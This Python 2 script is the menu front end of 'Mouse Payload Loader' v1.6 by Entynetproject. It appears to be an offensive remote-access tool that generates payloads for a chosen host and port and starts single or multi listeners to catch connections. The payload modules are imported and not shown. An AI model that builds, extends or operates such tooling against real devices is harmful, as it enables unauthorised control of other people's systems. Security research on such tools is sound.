#!/usr/bin/python

#            --------------------------------------------------
#                           Mouse Payload Loader                
#            --------------------------------------------------
#                  Copyright (C) <2019>  <Entynetproject>
#
#        This program is free software: you can redistribute it and/or modify
#        it under the terms of the GNU General Public License as published by
#        the Free Software Foundation, either version 3 of the License, or
#        any later version.
#
#        This program is distributed in the hope that it will be useful,
#        but WITHOUT ANY WARRANTY; without even the implied warranty of
#        MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
#        GNU General Public License for more details.
#
#        You should have received a copy of the GNU General Public License
#        along with this program.  If not, see <http://www.gnu.org/licenses/>.

import os

os.system("printf '\033]2;Mouse Payload Loader\a'")

from modules import server
from modules import helper as h
import sys
import platform
import time

SAS='dev'

def show_graphic():
    print(h.WHITE+"-"*27)
    print("")
    print(h.GREEN_THIN+"    1"+h.ENDC+") Start Server")
    print(h.GREEN_THIN+"    2"+h.ENDC+") Start MultiHandler")
    print(h.GREEN_THIN+"    3"+h.ENDC+") Create Payload")
    print(h.GREEN_THIN+"    4"+h.ENDC+") Clean Payloads")
    print(h.GREEN_THIN+"    5"+h.ENDC+") Clean Downloads")
    print(h.GREEN_THIN+"    6"+h.ENDC+") Update Mouse")
    print(h.GREEN_THIN+"    0"+h.ENDC+") Exit")
    print("")
    
class mouse:
    def __init__(self):
        h.generate_keys()
        self.server = server.Server()
        if len(sys.argv) == 2 and sys.argv[1] == "debug":
            self.server.debug = True
        else:
            self.server.debug = False
        self.payloads = self.import_payloads() 
        self.banner_text = h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject\n"+h.ENDC
        
    # Actions
    def print_payload(self,payload,number_option):
        print (h.GREEN_THIN+" " * 4 + str(number_option) +h.ENDC+") "+ payload.name)
    


    def start_single_server(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        if not self.server.set_host_port():
            return
        self.server.start_single_handler()


    def start_multi_handler(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        if not self.server.set_host_port():
            return
        self.server.start_multi_handler()


    def prompt_run_server(self):
        if raw_input(h.CYAN+"[*]"+h.WHITE+" Start Server? (Y/n): ") == "n":
            return
        else:
            if raw_input(h.CYAN+"[*]"+h.WHITE+" MultiHandler? (y/N): ") == "y":
                self.server.start_multi_handler()
            else:
                self.server.start_single_handler()


    def import_payloads(self):
        path = "modules/payloads"
        sys.path.append(path)
        modules = dict()
        for mod in os.listdir(path):
            if mod == '__init__.py' or mod[-3:] != '.py':
                continue
            else:
                m = __import__(mod[:-3]).payload()
                modules[m.name] = m
        return modules


    def exit_menu(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        exit()
        
    def update_mouse(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        os.system("chmod +x bin/mouse && bin/mouse -u")
        
        
    def clean_downloads(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        os.system("chmod +x bin/mouse && bin/mouse -c downloads")
        
    def clean_payloads(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        os.system("chmod +x bin/mouse && bin/mouse -c payloads")

    def choose_payload(self):
        os.system("clear")
        print(h.ENDC+"""
         _     __,..---""-._                 ';-,
  ,    _/_),-"`             '-.                `\\\\
 \|.-"`    -_)                 '.                ||
 /`   a   ,                      \              .'/
 '.___,__/                 .-'    \_        _.-'.'
    |\  \      \         /`        _`------`_.-'
       _/;--._, >        |   --.__/ `------`
     (((-'  __//`'-......-;\      )
          (((-'       __//  '--. /   mouse/MPL
                    (((-'    __//
                           (((-'
"""+h.WHITE+"Mouse Payload Loader"+h.GREEN_THIN+" v1.6"+h.WHITE+"\nDeveloped by Entynetproject"+h.ENDC)
        print(h.WHITE+"-"*27)
        print("")
        number_option = 1
        for key in self.payloads:
            payload = self.payloads[key]
            self.print_payload(payload,number_option)
            number_option += 1
        print ""
        while 1:
            try:
                # choose payload
                option = raw_input(h.info_general_raw("Choose Payload> "))
                if not option:
                  continue
                selected_payload = self.payloads[self.payloads.keys()[int(option) - 1]]
                # set host and port
                self.server.set_host_port()
                # generate payload
                selected_payload.run(self.server)
                #run
                self.prompt_run_server()
                break
            except KeyboardInterrupt:
                break
            except Exception as e:
                print e
                break


    def menu(self,err=""):
        while 1:
            try:
                h.clear()
                if err:
                    print err
                if self.server.debug:
                    print "Debug mode: on"
                sys.stdout.write(self.banner_text)
                show_graphic()
                option = raw_input(h.NES)
                choose = {
                    "1" : self.start_single_server,
                    "2" : self.start_multi_handler,
                    "3" : self.choose_payload,
                    "4" : self.clean_payloads,
                    "5" : self.clean_downloads,
                    "6" : self.update_mouse,
                    "0" : self.exit_menu
                }
                try:
                    choose[option]()
                    self.menu()
                except KeyError:
                    if option:
                        self.menu()
                    else:
                        self.menu()
                except KeyboardInterrupt:
                    continue
                    # TODO: quit socket listener
            except KeyboardInterrupt:
                
                exit()


if __name__ == "__main__":
    mouse = mouse()
    mouse.menu()
